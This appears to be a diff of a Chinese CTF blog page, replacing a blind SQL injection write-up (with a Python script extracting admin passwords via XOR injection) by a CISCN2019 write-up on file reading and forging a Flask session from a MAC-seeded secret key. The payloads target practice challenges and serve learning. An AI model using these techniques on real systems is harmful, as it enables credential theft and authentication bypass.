@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>[Black Watch 入群题]Web(简单的sql盲注) | 过客</title>	
+<title>[CISCN2019 华东南赛区]Web4(flask伪造sessin) | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">[Black Watch 入群题]Web(简单的sql盲注)</h1>
+			<h1 class="wow swing entry-title">[CISCN2019 华东南赛区]Web4(flask伪造sessin)</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-11 09:44:07" itemprop="datePublished" pubdate="">2020-03-11</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-11 13:28:19" itemprop="datePublished" pubdate="">2020-03-11</time></i>
 	          </div>
 			
 </span>
@@ -161,43 +161,35 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>一个登陆。三条信息。点击信息。发现真实的请求<br>
-<img src="https://guokeya.github.io/post-images/1583891081282.png" alt="" loading="lazy"></p>
+				<p>任意文件读取。这个就不说了<br>
+读取/proc/self/environ得到路径/app<br>
+读取/app/app.py得到源码<br>
+<img src="https://guokeya.github.io/post-images/1583904589881.png" alt="" loading="lazy"></p>
 <!-- more -->
-<p><code>=||&amp;</code>被禁用了。来个异或就可以了</p>
-<pre><code>import  requests
-import time
-r=requests.session()
-for a in range(1,100):
-    for b in range(30,130):
-        payload='http://19419e22-9b52-4ee2-b4a3-daca4b602a3f.node3.buuoj.cn/backend/content_detail.php?id=0^(ord(substr((select(group_concat(password))from(admin)),'+str(a)+',1))&lt;'+str(b)+')'  
-        result=r.get(url=payload)
-        time.sleep(0.1)
-        if 'title' in result.text:
-            print (chr(b-1))
-            break
+<p>过于简单。就不说了。读/sys/class/net/eth0/address</p>
+<pre><code>import random
+mac=&quot;02:42:ae:00:fb:f8&quot;
+random.seed(int(mac.replace(&quot;:&quot;, &quot;&quot;), 16))
+key = str(random.random() * 233)
+print key
 </code></pre>
-<p>一开始我直接用group_concat(username,password)。跑出来了32位的账号密码<br>
-输进去不对。后来才发现。group_concat忘记加上连接符了。。<br>
-智商下线。<br>
-第二个账号启用了。登陆得到flag</p>
+<p>得到key<code>138.496124035</code><br>
+用python2加密下数据。替换不行。。<br>
+用python3加密下数据。就好了<br>
+<img src="https://guokeya.github.io/post-images/1583905002906.png" alt="" loading="lazy"></p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
 				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
 				 
-				<a href="https://guokeya.github.io/tag/Web/" rel="tag">Web安全</a>	
-				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/NYz3X1BlK/" rel="prev"> [CISCN2019 华东南赛区]Web4(flask伪造sessin)</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/HYkvm--vb/" rel="next"> [Zer0pts2020]Can you guess it?</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/DWuGlVNuC/" rel="next"> [Black Watch 入群题]Web(简单的sql盲注)</a></div>
 		
 		</div>
 	</nav>
